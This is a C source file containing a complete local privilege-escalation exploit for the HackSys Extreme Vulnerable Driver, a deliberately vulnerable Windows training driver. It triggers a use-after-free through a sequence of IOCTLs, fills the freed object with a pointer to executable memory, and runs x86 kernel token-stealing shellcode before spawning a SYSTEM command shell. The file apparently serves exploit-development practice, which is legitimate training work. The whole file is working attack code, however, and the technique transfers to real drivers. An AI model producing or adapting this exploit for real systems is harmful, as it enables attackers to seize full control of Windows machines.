#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#include <windows.h>
#include <psapi.h>

#define IOCTL(Function) CTL_CODE (FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)

#define HEVD_ALLOCATE_ROBJ IOCTL(0x804)
#define HEVD_CALL_FPTR     IOCTL(0x805)
#define HEVD_FREE          IOCTL(0x806)
#define HEVD_ALLOCATE_FOBJ IOCTL(0x807)

typedef struct _FAKE_OBJECT_NON_PAGED_POOL
{
  CHAR Buffer[0x58];
} FAKE_OBJECT_NON_PAGED_POOL, *PFAKE_OBJECT_NON_PAGED_POOL;

/* sendIoctl:
     Send the IOCTL code to the driver */
void sendIoctl(HANDLE hHEVD, DWORD dIoctl, CHAR *pBuffer, DWORD dBuffer)
{
  DWORD bytesReturned = 0;

  printf("[*] Calling IOCTL Code 0x%x\n", dIoctl);
  DeviceIoControl(hHEVD,
                  dIoctl,
                  pBuffer,
                  dBuffer,
                  NULL,
                  0x00,
                  &bytesReturned,
                  NULL);

  return;
}

/* allocate_buffer:
     Creates a userland allocation with the first 4 bytes pointing to the address where our shellcode
     was allocated. */
char *allocate_buffer(void *shellcode_addr)
{
  char *buffer = malloc(sizeof(FAKE_OBJECT_NON_PAGED_POOL));
  if (buffer != NULL)
  {
    printf("[*] Shellcode located at: %p\n", &shellcode_addr);
    memcpy(buffer, &shellcode_addr, 4);
    memset(buffer+4, 'A', 83);
  }

  return buffer;
}

int main()
{
  HANDLE hHEVD = NULL;
  char *evilBuffer = NULL;

  char shellcode[] = 

  // sickle -a x86 -p windows/x86/kernel_token_stealer -f c -m pinpoint
  "\x60"                         // pushal 
  "\x31\xc0"                     // xor eax, eax
  "\x64\x8b\x80\x24\x01\x00\x00" // mov eax, dword ptr fs:[eax + 0x124]
  "\x8b\x40\x50"                 // mov eax, dword ptr [eax + 0x50]
  "\x89\xc1"                     // mov ecx, eax
  "\xba\x04\x00\x00\x00"         // mov edx, 4
  "\x8b\x80\xb8\x00\x00\x00"     // mov eax, dword ptr [eax + 0xb8]
  "\x2d\xb8\x00\x00\x00"         // sub eax, 0xb8
  "\x39\x90\xb4\x00\x00\x00"     // cmp dword ptr [eax + 0xb4], edx
  "\x75\xed"                     // jne 0x1014
  "\x8b\x90\xf8\x00\x00\x00"     // mov edx, dword ptr [eax + 0xf8]
  "\x89\x91\xf8\x00\x00\x00"     // mov dword ptr [ecx + 0xf8], edx
  "\x61"                         // popal

  // return to userland code
  "\x31\xc0"                     // xor eax,eax
  "\xC3";                        // ret

  LPVOID lpPayload = VirtualAlloc(NULL,
                                  56,
                                  (MEM_COMMIT | MEM_RESERVE),
                                  PAGE_EXECUTE_READWRITE);

  if (lpPayload == NULL)
  {
    printf("[-] Failed to create shellcode allocation\n");
    return -1;
  }

  memcpy(lpPayload, shellcode, 56);

  hHEVD = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
                      (GENERIC_READ | GENERIC_WRITE),
                      0x00,
                      NULL,
                      OPEN_EXISTING,
                      FILE_ATTRIBUTE_NORMAL,
                      NULL);

  if (hHEVD == INVALID_HANDLE_VALUE)
  {
    printf("[-] Failed to get a handle on HackSysExtremeVulnerableDriver\n");
    return -1;
  }

  evilBuffer = allocate_buffer(lpPayload);
  if (evilBuffer == NULL)
  {
    printf("[*] Failed to allocate evil buffer (userland)\n");
    return -1;
  }

  printf("[*] Allocating PUSE_AFTER_FREE_NON_PAGED_POOL object\n");
  sendIoctl(hHEVD, HEVD_ALLOCATE_ROBJ, NULL, 0);

  printf("[*] Freeing object\n");
  sendIoctl(hHEVD, HEVD_FREE, NULL, 0);

  printf("[*] Allocating FAKE_OBJECT_NON_PAGED_POOL\n");
  sendIoctl(hHEVD, HEVD_ALLOCATE_FOBJ, evilBuffer, sizeof(FAKE_OBJECT_NON_PAGED_POOL));

  printf("[*] Triggering UAF\n");
  sendIoctl(hHEVD, HEVD_CALL_FPTR, NULL, 0);

  printf("[+] Enjoy the shell :)\n\n");

  system("cmd.exe");
}
